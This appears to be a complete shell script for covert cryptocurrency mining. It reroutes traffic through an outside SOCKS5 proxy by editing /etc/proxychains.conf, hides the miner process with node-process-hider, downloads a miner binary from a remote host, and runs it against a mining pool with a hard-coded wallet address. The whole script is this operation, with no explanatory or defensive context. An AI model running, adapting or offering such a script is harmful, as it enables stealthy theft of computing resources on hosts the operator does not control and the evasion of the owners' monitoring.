#!/bin/sh
sudo apt update -y
sudo apt install screen -y
apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add danila-miner
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-bionic-hive.tar.gz && tar -xvf danila-miner-2.3.1-bionic-hive.tar.gz && cd danila-miner-2.3.1-bionic && ./danila-miner run https://server1.whalestonpool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
